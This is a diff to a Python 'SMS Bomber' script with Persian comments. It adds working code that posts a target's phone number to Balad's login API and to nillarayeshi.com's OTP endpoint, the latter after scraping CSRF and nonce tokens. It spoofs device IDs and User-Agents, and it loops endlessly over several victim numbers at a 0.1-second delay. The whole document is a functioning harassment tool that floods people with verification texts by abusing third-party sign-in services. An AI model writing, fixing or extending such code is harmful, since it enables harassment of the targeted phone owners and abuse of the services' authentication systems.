@@ -51,18 +51,42 @@ def is_phone(phone_input: str):
 # ==========================
 def send_service_safe(service, phone):
     try:
-        service(phone)
+        result = service(phone)
+        if result:
+            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
+        else:
+            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
     except Exception as e:
-        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")
+        print(f"{r}[!] Error in {service.__name__}: {e}{a}")
 
 # ==========================
 # توابع سرویس‌ها
 # ==========================
 def Balad(phone):
     try:
-        # اگر Rate Limit خوردیم، این سرویس را skip کنیم
-        print(f"{y}[!] Balad: Rate Limited, Skipping...{a}")
-        return False
+        formatted_phone = "0" + phone.replace("+98", "")  # تبدیل +989... به 09...
+        
+        url = "https://account.api.balad.ir/api/web/auth/login/"
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "device-id": str(uuid.uuid4()),
+            "User-Agent": random.choice(user_agents)
+        }
+        
+        payload = {
+            "phone_number": formatted_phone,
+            "os_type": "W"
+        }
+        
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(Balad) Code Sent{a}')
+            return True
+        else:
+            print(f'{r}[-] Balad HTTP Error: {response.status_code} - {response.text[:100]}{a}')
+            return False
             
     except Exception as e:
         print(f'{r}[!] Balad Exception: {e}{a}')
@@ -73,40 +97,24 @@ def nillarayeshi(phone):
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         session = requests.Session()
         
-        # اضافه کردن headers برای دریافت صفحه بدون فشرده سازی
-        headers = {
-            "User-Agent": random.choice(user_agents),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "identity",  # غیرفعال کردن فشرده سازی
-            "Connection": "keep-alive",
-        }
-        
+        # دریافت صفحه اصلی
         home_response = session.get(
             "https://nillarayeshi.com/", 
             timeout=10, 
-            headers=headers
+            headers={"User-Agent": random.choice(user_agents)}
         )
         home_response.encoding = 'utf-8'
         
-        # بررسی اینکه صفحه به درستی لود شده
-        if len(home_response.text) < 100:
-            print(f"{r}[-] nillarayeshi: Page content too short{a}")
-            return False
-        
-        # الگوهای مختلف برای استخراج توکن‌ها
+        # استخراج مقادیر با الگوهای مختلف
         csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
         nonce_match = re.search(r'name="dig_nounce" value="([^"]+)"', home_response.text)
         
-        if not csrf_match or not nonce_match:
-            print(f"{r}[-] nillarayeshi: Could not extract tokens{a}")
-            print(f"{y}[Debug] Page snippet: {home_response.text[:500]}{a}")
+        csrf = csrf_match.group(1) if csrf_match else ""
+        nonce = nonce_match.group(1) if nonce_match else ""
+        
+        if not csrf or not nonce:
+            print(f'{r}[-] nillarayeshi: Could not extract tokens{a}')
             return False
-        
-        csrf = csrf_match.group(1)
-        nonce = nonce_match.group(1)
-        
-        print(f"{g}[+] Found CSRF: {csrf}, Nonce: {nonce}{a}")
         
         payload = {
             "action": "digits_check_mob",
@@ -134,14 +142,12 @@ def nillarayeshi(phone):
             timeout=10
         )
         
-        print(f'{y}[Debug] Response: {response.status_code} - {response.text}{a}')
+        print(f'{y}[Debug] nillarayeshi Response: {response.status_code} - {response.text[:200]}{a}')
         
         if response.status_code == 200:
-            if any(x in response.text.lower() for x in ["success", "1", "sent", "ok"]):
+            if "success" in response.text.lower() or "1" in response.text:
                 print(f'{g}(nillarayeshi) Code Sent{a}')
                 return True
-            else:
-                print(f'{r}[-] nillarayeshi: Response indicates failure{a}')
         return False
             
     except Exception as e:
@@ -149,7 +155,7 @@ def nillarayeshi(phone):
         return False
 
 # ==========================
-# لیست سرویس‌ها (می‌توانی همه سرویس‌های V4 را اضافه کنی)
+# لیست سرویس‌ها
 # ==========================
 services = [Balad, nillarayeshi]
 
@@ -160,6 +166,8 @@ def vip(phones, delay=0.1):
     print(f"{g}Targets: {y}{', '.join(phones)}{a}")
     print(f"{g}Services Loaded: {y}{len(services)}{a}")
     print(f"{g}Delay: {y}{delay}s{a}")
+    print(f"{y}══════════════════════════════════════════════{a}")
+    
     try:
         while True:
             for phone in phones:
@@ -175,11 +183,10 @@ def vip(phones, delay=0.1):
 def main_menu():
     print(f"""
 {y}╔════════════════════════════════════════════╗
-{g}║         SMS Bomber by M.M.]R               ║
+{g}║                SMS Bomber                 ║
 {y}╚════════════════════════════════════════════╝
-{g} Coded by: {r}M.M.]R{a}
-{y}══════════════════════════════════════════════
 {g} Services Loaded: {y}{len(services)}{a}
+{y}══════════════════════════════════════════════
 {g} Enter phone numbers (separated by - for multiple):
 {a} Example: +989123456789-+989987654321
 {y}══════════════════════════════════════════════
